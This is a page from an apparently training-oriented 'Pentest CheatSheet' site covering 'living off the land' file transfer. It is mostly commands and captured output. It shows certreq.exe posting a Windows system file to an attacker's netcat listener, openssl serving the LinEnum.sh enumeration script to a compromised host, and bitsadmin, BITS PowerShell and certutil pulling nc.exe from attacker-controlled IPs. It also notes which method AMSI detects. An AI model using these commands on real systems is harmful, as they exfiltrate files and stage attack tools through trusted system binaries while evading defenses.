@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Pentest CheatSheet | Pentest CheatSheet</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Pentest CheatSheet" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Pentest CheatSheet" />
+<meta property="og:description" content="Pentest CheatSheet" />
+<link rel="canonical" href="http://localhost:4000/zNew/TransferFiles/LivingOffTheLand.html" />
+<meta property="og:url" content="http://localhost:4000/zNew/TransferFiles/LivingOffTheLand.html" />
+<meta property="og:site_name" content="Pentest CheatSheet" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Pentest CheatSheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/TransferFiles/LivingOffTheLand.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Pentest CheatSheet</h1>
+        </a>
+        <h2>Pentest CheatSheet</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="living-off-the-land">Living off The Land</h1>
+<ul>
+  <li><a href="https://lolbas-project.github.io/">LOLBAS Project for Windows Binaries</a></li>
+  <li><a href="https://gtfobins.github.io/">GTFOBins for Linux Binaries</a></li>
+</ul>
+
+<h2 id="using-the-lolbas-and-gtfobins-project">Using the LOLBAS and GTFOBins Project</h2>
+<p><strong>Upload win.ini to our Target</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> certreq.exe <span class="nt">-Post</span> <span class="nt">-config</span> http://192.168.49.128:8000/ c:<span class="se">\w</span>indows<span class="se">\w</span><span class="k">in</span>.ini
+Certificate Request Processor: The operation timed out 0x80072ee2 <span class="o">(</span>WinHttp: 12002 ERROR_WINHTTP_TIMEOUT<span class="o">)</span>
+</code></pre></div></div>
+
+<p>This will send the file to our Netcat session, and we can copy-paste its contents.</p>
+
+<p><strong>File Received in our Netcat Session</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lvnp</span> 8000
+
+listening on <span class="o">[</span>any] 8000 ...
+connect to <span class="o">[</span>192.168.49.128] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.49.1] 53819
+POST / HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Content-Type: application/json
+User-Agent: Mozilla/4.0 <span class="o">(</span>compatible<span class="p">;</span> Win32<span class="p">;</span> NDES client 10.0.19041.1466/vb_release_svc_prod1<span class="o">)</span>
+Content-Length: 92
+Host: 192.168.49.128:8000
+
+<span class="p">;</span> <span class="k">for </span>16-bit app support
+<span class="o">[</span>fonts]
+<span class="o">[</span>extensions]
+<span class="o">[</span>mci extensions]
+<span class="o">[</span>files]
+<span class="o">[</span>Mail]
+<span class="nv">MAPI</span><span class="o">=</span>1
+</code></pre></div></div>
+
+<p>If you get an error when running certreq.exe, the version you are using may not contain the -Post parameter. You can download an updated version here and try again.</p>
+
+<h2 id="gtfobins">GTFOBins</h2>
+<p><strong>Create Certificate in our Pwnbox</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openssl req <span class="nt">-newkey</span> rsa:2048 <span class="nt">-nodes</span> <span class="nt">-keyout</span> key.pem <span class="nt">-x509</span> <span class="nt">-days</span> 365 <span class="nt">-out</span> certificate.pem
+
+Generating a RSA private key
+.......................................................................................................+++++
+................+++++
+writing new private key to <span class="s1">'key.pem'</span>
+<span class="nt">-----</span>
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter <span class="s1">'.'</span>, the field will be left blank.
+<span class="nt">-----</span>
+Country Name <span class="o">(</span>2 letter code<span class="o">)</span> <span class="o">[</span>AU]:
+State or Province Name <span class="o">(</span>full name<span class="o">)</span> <span class="o">[</span>Some-State]:
+Locality Name <span class="o">(</span>eg, city<span class="o">)</span> <span class="o">[]</span>:
+Organization Name <span class="o">(</span>eg, company<span class="o">)</span> <span class="o">[</span>Internet Widgits Pty Ltd]:
+Organizational Unit Name <span class="o">(</span>eg, section<span class="o">)</span> <span class="o">[]</span>:
+Common Name <span class="o">(</span>e.g. server FQDN or YOUR name<span class="o">)</span> <span class="o">[]</span>:
+Email Address <span class="o">[]</span>:
+</code></pre></div></div>
+
+<p><strong>Stand up the Server in our Pwnbox</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openssl s_server <span class="nt">-quiet</span> <span class="nt">-accept</span> 80 <span class="nt">-cert</span> certificate.pem <span class="nt">-key</span> key.pem &lt; /tmp/LinEnum.sh
+</code></pre></div></div>
+
+<p><strong>Download File from the Compromised Machine</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> 10.10.10.32:80 <span class="nt">-quiet</span> <span class="o">&gt;</span> LinEnum.sh
+</code></pre></div></div>
+
+<h2 id="other-common-living-off-the-land-tools">Other Common Living off the Land tools</h2>
+<h3 id="bitsadmin-download-function">Bitsadmin Download function</h3>
+<p><strong>File Download with Bitsadmin</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:<span class="se">\U</span>sers<span class="se">\h</span>tb-student<span class="se">\D</span>esktop<span class="se">\n</span>c.exe
+</code></pre></div></div>
+
+<p>PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.
+<strong>Download</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> Import-Module bitstransfer<span class="p">;</span> Start-BitsTransfer <span class="nt">-Source</span> <span class="s2">"http://10.10.10.32:8000/nc.exe"</span> <span class="nt">-Destination</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">c.exe"</span>
+</code></pre></div></div>
+
+<h3 id="certutil">Certutil</h3>
+<p>Casey Smith (@subTee) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.</p>
+
+<p><strong>Download a File with Certutil</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+&gt; certutil.exe -urlcache -f http://10.10.10.32:8000/nc.exe nc.exe
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
